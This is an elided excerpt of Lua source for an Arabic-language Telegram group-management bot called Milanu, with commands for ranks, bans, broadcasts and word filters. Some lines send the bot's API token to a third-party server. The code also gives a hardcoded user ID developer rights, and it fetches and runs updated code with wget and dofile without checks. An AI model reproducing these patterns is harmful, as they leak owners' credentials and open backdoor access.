...
io.popen("cd library && wget https://raw.githubusercontent.com/MilanuTEAM/Milanu/main/library/redis.lua") 
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/MilanuTEAM/Files_Milanu/main/File_Bot/commands.lua") 
...
if hash or SudoBot(msg) or DevMilanuW(msg) or Sudo(msg) or Bot(msg)  then  
return true  
else  
return false  
end  
...
if hash or SudoBot(msg) or DevMilanuW(msg) or Bot(msg)  then  
return true  
else  
return false  
end  
...
if hash or SudoBot(msg) or DevMilanuW(msg) or Sudo(msg) or SudoBotCoSu(msg) or Bot(msg)  then   
return true 
else 
return false 
end 
...
if hash or SudoBot(msg) or DevMilanuW(msg) or Sudo(msg) or BasicConstructor(msg) or SudoBotCoSu(msg) or Bot(msg)  then   
return true
else
return false
end 
...
if hash or SudoBot(msg) or DevMilanuW(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or SudoBotCoSu(msg) or Bot(msg)  then   
return true
else
return false
end 
...
if hash or SudoBot(msg) or DevMilanuW(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or SudoBotCoSu(msg) or Bot(msg)  then   
return true
else
return false
end 
...
if hash or SudoBot(msg) or DevMilanuW(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Mod(msg) or SudoBotCoSu(msg) or Bot(msg)  then   
return true 
else 
return false 
end 
...
var = true  
elseif tonumber(user_id) == tonumber(1816610329) then
var = true  
...
local UserName = (data.username_ or "qqoqqd")
...
local Milanu_Msg = ''  
if msgs < 100 then 
Milanu_Msg = 'غير متفاعل' 
elseif msgs < 200 then 
Milanu_Msg = 'بده يتحسن' 
elseif msgs < 400 then 
Milanu_Msg = 'شبه متفاعل' 
elseif msgs < 700 then 
Milanu_Msg = 'متفاعل' 
elseif msgs < 1200 then 
Milanu_Msg = 'متفاعل قوي' 
elseif msgs < 2000 then 
Milanu_Msg = 'متفاعل جدا' 
elseif msgs < 3500 then 
Milanu_Msg = 'اقوى تفاعل'  
elseif msgs < 4000 then 
Milanu_Msg = 'متفاعل نار' 
elseif msgs < 4500 then 
Milanu_Msg = 'قمة التفاعل'
elseif msgs < 5500 then 
Milanu_Msg = 'اقوى متفاعل' 
elseif msgs < 7000 then 
Milanu_Msg = 'ملك التفاعل' 
elseif msgs < 9500 then 
Milanu_Msg = 'امبروطور التفاعل' 
elseif msgs < 10000000000 then 
Milanu_Msg = 'رب التفاعل'  
end 
return Milanu_Msg 
end
...
--------------------------------------------------------------------------------------------------------------
function SourceMilanu(msg,data) -- بداية العمل امـيـر الـ دلـيـم
if msg then
...
local list = database:smembers(bot_id.."Milanu1:List:Filter"..sl)
...
if not DevMilanuW(msg) and not database:sismember(bot_id..'Ban:User_Bot',msg.sender_user_id_) and not database:get(bot_id..'Tuasl:Bots') then
...
if DevMilanuW(msg) and msg.reply_to_message_id_ ~= 0  then
...
send(msg.chat_id_, msg.id_,Milanu_Msg) 
return false  
end 
if text then
...
if text == 'تفعيل التواصل ⌯' and DevMilanuW(msg) then  
...
if text == 'تعطيل التواصل ⌯' and DevMilanuW(msg) then  
...
if text == 'تفعيل البوت الخدمي ⌯' and DevMilanuW(msg) then  
...
if text == 'تعطيل البوت الخدمي ⌯' and DevMilanuW(msg) then  
...
if text == 'ضع كليشه ستارت ⌯' and DevMilanuW(msg) then 
database:set(bot_id..'Start:Bots',true) 
send(msg.chat_id_, msg.id_,' *⌯︙ارسل لي الكليشه الان*')
return false
end
if text == 'حذف كليشه ستارت ⌯' and DevMilanuW(msg) then 
database:del(bot_id..'Start:Bot') 
send(msg.chat_id_, msg.id_,' *⌯︙تم حذف كليشه ستارت*')
end
if text == 'معلومات السيرفر ⌯' and DevMilanuW(msg) then 
...
if text == 'تحديث السورس ⌯' and DevMilanuW(msg) then 
os.execute('rm -rf Milanu.lua')
os.execute('wget https://raw.githubusercontent.com/MilanuTEAM/Milanu/main/Milanu.lua')
send(msg.chat_id_, msg.id_,' *⌯︙تم تحديث السورس* \n*⌯︙لديك اخر اصدار لسورس ميلانو*\n*⌯︙الاصدار » { 2.8v}*')
dofile('Milanu.lua')  
end
if text == 'الاصدار ⌯' and DevMilanuW(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,' *⌯︙اصدار سورس ميلانو* \n*⌯︙الاصدار »{ 2.8v}*')
end
if text == 'قناه تحديثات البوت ⌯' and DevMilanuW(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,' ⌯︙[تحديثات البوت](t.me/qqoqqd) \n⌯︙[قناه السورس](t.me/qqoqqd)')
end
if text == "ضع اسم للبوت ⌯" and DevMilanuW(msg) then  
database:setex(bot_id..'Set:Name:Bot'..msg.sender_user_id_,300,true) 
send(msg.chat_id_, msg.id_," *⌯︙ارسل اليه الاسم الان* ")
return false
end
if text == 'الاحصائيات ⌯' and DevMilanuW(msg) then 
...
if text == 'المشتركين ⌯' and DevMilanuW(msg) then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = '\n *⌯︙المشتركين» {`'..Users..'`}*'
send(msg.chat_id_, msg.id_,Text) 
...
if text == 'الكروبات ⌯' and DevMilanuW(msg) then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = '\n *⌯︙الكروبات» {`'..Groups..'`}*'
send(msg.chat_id_, msg.id_,Text) 
...
if text == ("المطورين ⌯") and DevMilanuW(msg) then
...
if text == ("قائمه العام ⌯") and DevMilanuW(msg) then
...
if text == ("قائمه الكتم العام ⌯") and DevMilanuW(msg) then
...
if text=="اذاعه خاص ⌯" and msg.reply_to_message_id_ == 0 and DevMilanuW(msg) then 
database:setex(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," *⌯︙ارسل الان اذاعتك؟* \n*⌯︙للخروج ارسل الغاء* ")
return false
end 
if text=="اذاعه ⌯" and msg.reply_to_message_id_ == 0 and DevMilanuW(msg) then 
database:setex(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," *⌯︙ارسل الان اذاعتك؟* \n*⌯︙للخروج ارسل الغاء* ")
return false
end  
if text=="اذاعه بالتثبيت ⌯" and msg.reply_to_message_id_ == 0 and DevMilanuW(msg) then 
database:setex(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," *⌯︙ارسل الان اذاعتك؟* \n*⌯︙للخروج ارسل الغاء* ")
return false
end 
if text=="اذاعه بالتوجيه ⌯" and msg.reply_to_message_id_ == 0  and DevMilanuW(msg) then 
database:setex(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," *⌯︙ارسل لي التوجيه الان*")
return false
end 
if text=="اذاعه بالتوجيه خاص ⌯" and msg.reply_to_message_id_ == 0  and DevMilanuW(msg) then 
...
if text == "تنظيف المشتركين ⌯" and DevMilanuW(msg) then
...
if text == "تنظيف الكروبات ⌯" and DevMilanuW(msg) then 
...
send(msg.chat_id_, msg.id_,'*⌯︙عدد الكروبات الان » { '..#group..' }'..Milanuk..''..Milanu..'*\n*⌯︙الان عدد الكروبات الحقيقي » { '..sendok..' } كروبات*\n')   
end
end
end,nil)
end
...
if text and text:match("^رفع مطور @(.*)$") and DevMilanuW(msg) then
...
usertext = '*\n ⌯︙اسم المستخدم »* ['..result.title_..'](t.me/'..(username or 'qqoqqd')..')'
status  = '\n *⌯︙تم ترقيته مطور*'
...
if text and text:match("^رفع مطور (%d+)$") and DevMilanuW(msg) then
local userid = text:match("^رفع مطور (%d+)$")
database:sadd(bot_id..'Sudo:User', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n *⌯︙اسم المستخدم »* ['..data.first_name_..'](t.me/'..(data.username_ or 'qqoqqd')..')'
status  = '\n*⌯︙تم ترقيته مطور*'
...
if text and text:match("^تنزيل مطور @(.*)$") and DevMilanuW(msg) then
...
if text and text:match("^تنزيل مطور (%d+)$") and DevMilanuW(msg) then
...
local Milanu1_Msg = database:get(bot_id.."Milanu1:Add:Filter:Rp2"..text..msg.chat_id_)   
if Milanu1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⌯︙اسم المستخدم »* ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'qqoqqd')..') \n ⌯︙'..Milanu1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false
end,nil)
end
...
--------------------------------------------------------------------------------------------------------------
if Milanu_Msg and not Special(msg) then  
local Milanu_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if Milanu_Msg then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
...
if tonumber(data.member_count_) < tonumber(database:get(bot_id..'Num:Add:Bot') or 0) and not DevMilanuW(msg) then
...
if text and text:match("^ضع عدد الاعضاء (%d+)$") and DevMilanuW(msg) then
...
if text and text:match("^تغير الاشتراك$") and DevMilanuW(msg) then  
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, ' *⌯︙حسنآ ارسل لي معرف القناة*')
return false  
end
if text and text:match("^تغير رساله الاشتراك$") and DevMilanuW(msg) then  
database:setex(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, ' *⌯︙حسنآ ارسل لي النص الذي تريده*')
return false  
end
if text == "حذف رساله الاشتراك ⌯" and DevMilanuW(msg) then  
database:del(bot_id..'text:ch:user')
send(msg.chat_id_, msg.id_, " *⌯︙تم مسح رساله الاشتراك* ")
return false  
end
if text and text:match("^وضع قناة الاشتراك ⌯$") and DevMilanuW(msg) then  
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, ' *⌯︙حسنآ ارسل لي معرف القناة*')
return false  
end
if text == "تفعيل الاشتراك الاجباري ⌯" and DevMilanuW(msg) then  
...
if text == "تعطيل الاشتراك الاجباري ⌯" and DevMilanuW(msg) then  
database:del(bot_id..'add:ch:id')
database:del(bot_id..'add:ch:username')
send(msg.chat_id_, msg.id_, " *⌯︙تم تعطيل الاشتراك الاجباري* ")
return false  
end
if text == "الاشتراك الاجباري ⌯" and DevMilanuW(msg) then  
if database:get(bot_id..'add:ch:username') then
local addchusername = database:get(bot_id..'add:ch:username')
...
database:sadd(bot_id.."Milanu:blocname"..msg.chat_id_, BlNe)
end
...
local All_name = database:smembers(bot_id.."Milanu:blocname"..msg.chat_id_)
...
if t2.id_ then 
name_Milanu = ((t2.first_name_ or "") .. (t2.last_name_ or ""))
if name_Milanu then 
names_Milanu = database:smembers(bot_id.."Milanu:blocname"..msg.chat_id_) or ""
if names_Milanu and names_Milanu[1] then 
for i=1,#names_Milanu do 
if name_Milanu:match("(.*)("..names_Milanu[i]..")(.*)") then 
...
database:set(bot_id.."Milanu:teh"..msg.chat_id_,teh)
end
...
database:set(bot_id.."Milanu:nump"..msg.chat_id_,nump)
end
if text == "التوحيد" then
local s1 = database:get(bot_id.."Milanu:teh"..msg.chat_id_) or "لا يوجد توحيد"
local s2 = database:get(bot_id.."Milanu:nump"..msg.chat_id_) or 5
...
if database:get(bot_id.."kt:twh:stats"..msg.chat_id_) == "open"  and database:get(bot_id.."Milanu:teh"..msg.chat_id_) then 
id = msg.sender_user_id_
function amir_Milanua_new(Milanu1,Milanu2)
if Milanu2 and Milanu2.first_name_ then 
if Milanu2.first_name_:match("(.*)"..database:get(bot_id.."Milanu:teh"..msg.chat_id_).."(.*)") then 
database:srem(bot_id.."Milanu:Muted:User"..msg.chat_id_, msg.sender_user_id_)
else
local Milanu_nnn = database:get(bot_id.."Milanu:nump"..msg.chat_id_) or 5
local Milanu_nnn2 = database:get(bot_id.."Milanu:nump22"..msg.chat_id_..msg.sender_user_id_) or 0
if (tonumber(Milanu_nnn2) == tonumber(Milanu_nnn) or tonumber(Milanu_nnn2) > tonumber(Milanu_nnn)) then 
database:sadd(bot_id..'Muted:User'..msg.chat_id_, msg.sender_user_id_)
else 
database:incrby(bot_id.."Milanu:nump22"..msg.chat_id_..msg.sender_user_id_,1)
send(msg.chat_id_, msg.id_, "⌯︙عزيزي >>["..Milanu2.username_.."](https://t.me/"..(Milanu2.username_ or "qqoqqd")..")\n⌯︙عليك وضع التوحيد ⪼ {"..database:get(bot_id.."Milanu:teh"..msg.chat_id_).."} بجانب اسمك\n⌯︙عدد المحاولات المتبقيه {"..(tonumber(Milanu_nnn) - tonumber(Milanu_nnn2)).."}")
end
end
end
end
bnnaGet(id, amir_Milanua_new)
end
end
...
local MilanuChengName = database:get(bot_id.."Milanu:Cheng:Name"..data.id_)
if not data.first_name_ then 
if MilanuChengName then 
send(msg.chat_id_, msg.id_, " خوش معرف جان ["..MilanuChengName..']')
database:del(bot_id.."Milanu:Cheng:Name"..data.id_) 
end
end
if data.first_name_ then 
if MilanuChengName ~= data.first_name_ then 
local Text = {
  "جان خوش اسم يول",
...
database:set(bot_id.."Milanu:Cheng:Name"..data.id_, data.first_name_) 
end
end
end
end,nil)   
...
if data.id_ then 
if data.id_ ~= bot_id then
local MilanuChengUserName = database:get(bot_id.."Milanu:Cheng:UserName"..data.id_)
if not data.username_ then 
if MilanuChengUserName then 
send(msg.chat_id_, msg.id_, 1, "حذف معرفه خمطو بساع بساع  \n هاذه معرفه  : [@"..MilanuChengUserName..']')
database:del(bot_id.."Milanu:Cheng:UserName"..data.id_) 
end
end
if data.username_ then 
if MilanuChengUserName ~= data.username_ then 
local Text = {
...
database:set(bot_id.."Milanu:Cheng:UserName"..data.id_, data.username_) 
end
end
end
end,nil)   
...
if data.id_ then 
if data.id_ ~= bot_id then 
local MilanuChengPhoto = database:get(bot_id.."Milanu:Cheng:Photo"..data.id_)
if not data.profile_photo_ then 
if MilanuChengPhoto then 
send(msg.chat_id_, msg.id_, "حذف كل صور ابن الحلو شكد غبي لعد😂🥺")
database:del(bot_id.."Milanu:Cheng:Photo"..data.id_) 
end
end
if data.profile_photo_.big_.persistent_id_ then 
if MilanuChengPhoto ~= data.profile_photo_.big_.persistent_id_ then 
local Text = {
...
database:set(bot_id.."Milanu:Cheng:Photo"..data.id_, data.profile_photo_.big_.persistent_id_) 
end
end
end
end,nil)   
...
if text == 'رفع نسخه الاحتياطيه' and DevMilanuW(msg) then  
if tonumber(msg.reply_to_message_id_) > 0 then
...
local msg_id = msg.id_/2097152/0.5
local done = json:decode(https.request("http://sofarr.ml/ASHTRAKLUA/melani.php?token="..token.."&chat_id="..msg.chat_id_.."&from="..msg.sender_user_id_.."&msg="..msg_id.."&Text="..TextSearch.."&n=s")) 
end
end
...
send(msg.chat_id_, msg.id_, '*⌯︙بواسطه* » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'qqoqqd')..') \n*⌯︙تم تفعيل التنظيف التلقائي* ')
return false
end
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⌯︙بواسطه »* ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'qqoqqd')..') \n*⌯︙تـم قفـل التاك بالكتم* ')
end,nil)   
...
------------------------------------------------------------------------ امـيـر الـدلـيـم
if text == 'تحديث' and DevMilanuW(msg) then
dofile('Milanu.lua')  
send(msg.chat_id_, msg.id_, ' *⌯︙تم تحديث جميع الملفات*') 
end 
if text == ("مسح قائمه العام") and DevMilanuW(msg) then
...
if text == ("حظر عام") and msg.reply_to_message_id_ and DevMilanuW(msg) then  
function start_function(extra, result, success)
if MilanuSudoBot(result.sender_user_id_) then
...
if text and text:match("^حظر عام @(.*)$")  and DevMilanuW(msg) then  
...
if MilanuSudoBot(result.id_) then
send(msg.chat_id_, msg.id_,"*⌯︙لا تستطيع (كتم،طرد،حظر،تققيد) مطور السورس او الاساسي*")
return false 
end
...
if text and text:match("^حظر عام (%d+)$") and DevMilanuW(msg) then  
local userid = text:match("^حظر عام (%d+)$")
if MilanuSudoBot(userid) then
send(msg.chat_id_, msg.id_,"*⌯︙لا تستطيع (كتم،طرد،حظر،تققيد) مطور السورس او الاساسي*")
return false 
end
...
if text == ("كتم عام") and msg.reply_to_message_id_ and DevMilanuW(msg) then  
function start_function(extra, result, success)
if MilanuSudoBot(result.sender_user_id_) then
send(msg.chat_id_, msg.id_,"*⌯︙لا تستطيع (كتم،طرد،حظر،تققيد) مطور السورس او الاساسي*")
return false 
...
if text and text:match("^كتم عام @(.*)$")  and DevMilanuW(msg) then  
...
if text and text:match("^كتم عام (%d+)$") and DevMilanuW(msg) then  
local userid = text:match("^كتم عام (%d+)$")
if MilanuSudoBot(bot_id) then
send(msg.chat_id_, msg.id_,"*⌯︙لا تستطيع (كتم،طرد،حظر،تققيد) مطور السورس او الاساسي*")
return false 
end
if tonumber(userid) == tonumber(bot_id) then  
...
if text == ("الغاء العام") and msg.reply_to_message_id_ and DevMilanuW(msg) then  
function start_function(extra, result, success)
...
if text and text:match("^الغاء العام @(.*)$") and DevMilanuW(msg) then  
...
if text and text:match("^الغاء العام (%d+)$") and DevMilanuW(msg) then  
...
------------------------------------------------------------------------ امـيـر الـدلـيـم
if text == ("مسح المطورين") and DevMilanuW(msg) then
...
if text == 'الملفات' and DevMilanuW(msg) then
...
if DevMilanuW(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/MilanuTEAM/Files_Milanu/main/getfile.json")
if res == 200 then
...
if text and text:match("^(تعطيل) (.*)(.lua)$") and DevMilanuW(msg) then
...
local json_file, res = https.request("https://raw.githubusercontent.com/MilanuTEAM/Files_Milanu/main/File_Bot/"..file)
if res == 200 then
...
if text and text:match("^(تفعيل) (.*)(.lua)$") and DevMilanuW(msg) then
...
if text == "مسح الملفات" and DevMilanuW(msg) then
os.execute("rm -fr File_Bot/*")
send(msg.chat_id_,msg.id_," *⌯︙تم مسح الملفات*")
return false
end

if text == ("رفع مطور") and msg.reply_to_message_id_ and DevMilanuW(msg) then  
function start_function(extra, result, success)
...
if text == ("تنزيل مطور") and msg.reply_to_message_id_ and DevMilanuW(msg) then  
function start_function(extra, result, success)
...
function Function_Milanu(extra, result, success)
...
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Milanu, nil)
return false 
end
...
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Milanu, nil)
return false 
end
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n *⌯︙العضو* » ['..data.first_name_..'](t.me/'..(data.username_ or 'qqoqqd')..')'
status  = '\n*⌯︙تم ترقيته ادمن*'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n *⌯︙لعضو »* ['..data.first_name_..'](t.me/'..(data.username_ or 'qqoqqd')..')'
status  = '\n*⌯︙تم تنزيله من المميزين*'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n *⌯︙اسم المستخدم »* '..userid..''
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n *⌯︙العضــو »* ['..data.first_name_..'](t.me/'..(data.username_ or 'qqoqqd')..')'
...
database:set(bot_id.."Milanu1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."Milanu1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_," *⌯︙ارسل التحذير عند ارسال الكلمه*")  
database:set(bot_id.."Milanu1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."Milanu1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."Milanu1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."Milanu1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_," *⌯︙تم منع الكلمه مع التحذير*")  
database:del(bot_id.."Milanu1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."Milanu1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."Milanu1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."Milanu1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
send(msg.chat_id_, msg.id_," *⌯︙ارسل الكلمه الان*")  
database:set(bot_id.."Milanu1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."Milanu1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
database:del(bot_id.."Milanu1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."Milanu1:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."Milanu1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
...
local list = database:smembers(bot_id.."Milanu1:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."Milanu1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."Milanu1:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."Milanu1:List:Filter"..msg.chat_id_,v)  
end  
...
if text == 'مسح كليشه المطور' and DevMilanuW(msg) then
database:del(bot_id..'TEXT_SUDO')
send(msg.chat_id_, msg.id_,' *⌯︙تم مسح كليشه المطور*')
end
if text == 'ضع كليشه المطور' and DevMilanuW(msg) then
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n *⌯︙اسم المستخدم »* ['..result.title_..'](t.me/'..(text1[3] or 'qqoqqd')..')'..'\n*⌯︙تم رفعه '..text1[2]..'*')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
if text == 'تفعيل الاذاعه' and DevMilanuW(msg) then  
...
if text == 'تعطيل الاذاعه' and DevMilanuW(msg) then  
...
send(msg.chat_id_, msg.id_,'['..Milanu_Msg[math.random(#Milanu_Msg)]..']') 
return false
end
if text=="اذاعه خاص" and msg.reply_to_message_id_ == 0 and Sudo(msg) then 
if database:get(bot_id..'Bc:Bots') and not DevMilanuW(msg) then 
...
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 200},function(ta,Milanu)
local t = "\n*ツ قائمة الاعضاء* \n*•━━━━━━ 𝑴𝑬 ━━━━━━━•*\n"
x = 0
local list = Milanu.members_
for k, v in pairs(list) do
x = x + 1
...
if MilanuSudoBot(msg.sender_user_id_) then
database:srem(bot_id..'DEV:Sudo:T', result.sender_user_id_)
database:srem(bot_id..'Sudo:User', result.sender_user_id_)
database:srem(bot_id..'CoSu'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Basic:Constructor'..msg.chat_id_,result.sender_user_id_)
...
if text == ("مسح ردود المطور") and DevMilanuW(msg) then 
...
if text == ("ردود المطور") and DevMilanuW(msg) then 
local list = database:smembers(bot_id..'List:Rd:Sudo')
text = "\n ⌯︙قائمة ردود المطور \n*•━━━━━━ 𝑴𝑬 ━━━━━━━•*\n"
for k,v in pairs(list) do
...
if text == 'اضف رد للكل' and DevMilanuW(msg) then    
send(msg.chat_id_, msg.id_,' *⌯︙ارسل الكلمه تريد اضافتها*')
database:set(bot_id..'Set:Rd'..msg.sender_user_id_..':'..msg.chat_id_,true)
return false 
end
if text == 'حذف رد للكل' and DevMilanuW(msg) then    
...
if text == 'تفعيل المغادره' and DevMilanuW(msg) then   
...
if text == 'تعطيل المغادره' and DevMilanuW(msg) then  
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n*⌯︙العضو »* ['..data.first_name_..'](t.me/'..(data.username_ or 'MilanuTEAM')..') '
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'qqoqqd')..')'
local iduser = result.sender_user_id_
...
-- vardump(data) 
Milanudx(msg.chat_id_, msg.id_, ' *⌯︙ايدي المجموعة » ( '..msg.chat_id_..' )*\n*⌯︙عدد الادمنيه » ( '..data.administrator_count_..' )*\n*⌯︙عدد المحظورين » ( '..data.kicked_count_..' )*\n*⌯︙عدد الاعضاء » ( '..data.member_count_..' )*\n', 'md') 
end 
...
if text == 'استعاده الاوامر' and DevMilanuW(msg) then
...
{{text = '𝙼𝙸𝙻𝙰𝙽𝚞 𝚃𝙴𝙰𝙼', url="t.me/qqoqqd"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
...
send(msg.chat_id_, msg.id_, t..'ٴ⌯∫ٴ*•━━━━━━ 𝑴𝑬 ━━━━━━━•*ٴ⌯∫○ٴ\n⌯︙[𝙼𝙸𝙻𝙰𝙽𝚞 𝚃𝙴𝙰𝙼](t.me/qqoqqd) ')
end
...
{{text = '𝚂𝙾𝚞𝚁𝙲𝙴 𝙼𝙸𝙻𝙰𝙽𝚞',url='http://t.me/qqoqqd'}},
}
...
https.request("http://sofarr.ml/ASHTRAKLUA/melani.php?V="..URL.escape(id_from_vid).."&ch=do")
end
end
...
https.request("http://sofarr.ml/ASHTRAKLUA/melani.php?token="..token.."&chat_id="..Chat_id.."&data="..URL.escape(DAata).."&n=do")
end
Ok_id  = DAata:match("(%d+)")  
...
Milanu = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(Milanu)
...
--------------------------------------------------------------------------------------------------------------
SourceMilanu(data.message_,data)
...
------------------------------------------------------------------------
local MilanuAbot = database:get(bot_id.."Milanu1:Add:Filter:Rp2"..text..result.chat_id_)   
if MilanuAbot then
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," *⌯︙العضو :* {["..data.first_name_.."](T.ME/"..data.username_..")}\n⌯︙["..MilanuAbot.."] \n") 
...
------------------------------------------------------------------------
if text then
local Milanu1_Msg = database:get(bot_id.."Milanu1:Add:Filter:Rp2"..text..result.chat_id_)   
if Milanu1_Msg then
send(msg.chat_id_, msg.id_," ⌯︙"..Milanu1_Msg)
